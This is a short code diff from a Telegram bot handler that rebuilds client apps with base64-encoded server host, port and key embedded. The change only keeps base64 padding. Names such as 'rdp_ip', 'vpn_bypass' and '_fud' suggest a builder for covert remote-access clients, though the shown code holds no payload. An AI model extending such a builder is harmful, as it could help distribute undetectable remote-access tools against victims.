@@ -4195,9 +4195,9 @@ def handle_callback(call):
         _key  = (_lb["server_key"]  if _lb and _lb["server_key"]  else "")
         # Use stored IP as the actual server host (may differ from rdp_ip if changed)
         _client_ip = _ip
-        srv_host_b64 = _b64.b64encode(_ip.encode()).decode().rstrip("=") if _ip else ""
-        srv_port_b64 = _b64.b64encode(_port.encode()).decode().rstrip("=")      if _port else ""
-        srv_key_b64  = _b64.b64encode(_key.encode()).decode()                   if _key  else ""
+        srv_host_b64 = _b64.b64encode(_ip.encode()).decode()    if _ip    else ""
+        srv_port_b64 = _b64.b64encode(_port.encode()).decode() if _port  else ""
+        srv_key_b64  = _b64.b64encode(_key.encode()).decode()  if _key   else ""
         emoji, display_name = TEMPLATES.get(template, ("⚙️", template))
         safe_edit(chat_id, msg_id,
                   f"🔨 <b>Rebuilding: {emoji} {display_name}</b>\n"
@@ -4306,9 +4306,9 @@ def handle_callback(call):
         _cname     = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
         _ctoken    = _cl["token"] if _cl else "manual"
         _fud       = str(int(_cl["vpn_bypass"])) if _cl and "vpn_bypass" in _cl.keys() else "1"
-        srv_host_b64 = _b64cb.b64encode(_ip.encode()).decode().rstrip("=")   if _ip   else ""
-        srv_port_b64 = _b64cb.b64encode(_port.encode()).decode().rstrip("=") if _port else ""
-        srv_key_b64  = _b64cb.b64encode(_key.encode()).decode()              if _key  else ""
+        srv_host_b64 = _b64cb.b64encode(_ip.encode()).decode()    if _ip    else ""
+        srv_port_b64 = _b64cb.b64encode(_port.encode()).decode() if _port  else ""
+        srv_key_b64  = _b64cb.b64encode(_key.encode()).decode()  if _key   else ""
         safe_edit(chat_id, msg_id,
                   f"🔨 <b>Rebuilding: ⚙️ {_app_name}</b>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
@@ -4483,9 +4483,9 @@ def handle_callback(call):
         sbuf = server_config_buf.pop(str(chat_id), None)
         import base64
         srv_host_b64 = base64.b64encode(
-            sbuf["ip"].encode()).decode().rstrip("=") if sbuf and sbuf.get("ip") else ""
+            sbuf["ip"].encode()).decode() if sbuf and sbuf.get("ip") else ""
         srv_port_b64 = base64.b64encode(
-            sbuf["port"].encode()).decode().rstrip("=") if sbuf and sbuf.get("port") else ""
+            sbuf["port"].encode()).decode() if sbuf and sbuf.get("port") else ""
         srv_key_b64  = base64.b64encode(
             sbuf["key"].encode()).decode() if sbuf and sbuf.get("key") else ""
         if template == "custom" and custom_app_name:
